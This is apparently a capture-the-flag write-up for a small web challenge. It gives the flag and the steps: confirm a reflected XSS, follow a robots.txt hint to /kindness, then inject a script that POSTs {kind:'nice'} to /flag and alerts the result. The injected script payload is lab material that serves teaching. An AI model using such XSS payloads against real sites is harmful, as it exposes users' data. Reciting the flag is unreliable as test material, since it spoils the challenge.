# Say Something Nice

# Description:

Sometimes, even a few words can make someone's day.

We built a tiny website where you can share a message. Surely there's nothing interesting hiding behind something as simple as a compliment... right?

## Flag: BTWCTF{r3fl3ct3d_x55_d1sc0v3r3d_succ355fu7ly}

## Solution:

1. Find the reflected XSS by submitting a payload and confirming that JavaScript executes.

2. Open `/robots.txt` and notice:

```text
User-agent: *
Disallow: /kindness
```

3. Visit `/kindness`. A normal `GET` request returns **404**, indicating that the endpoint expects a different method.

4. Use the XSS to make a `POST` request to `/kindness`. The response gives the clue:

```text
Nice try. The compliment must come from the page itself. Ask it nicely.
```

5. This points towards making a **nice** request to `/flag`.

6. Send:

```html
<script>
fetch('/flag',{
  method:'POST',
  headers:{'Content-Type':'application/json'},
  body:JSON.stringify({kind:'nice'})
})
.then(r=>r.json())
.then(x=>alert(x.flag))
</script>
```

7. The flag is returned in the response.
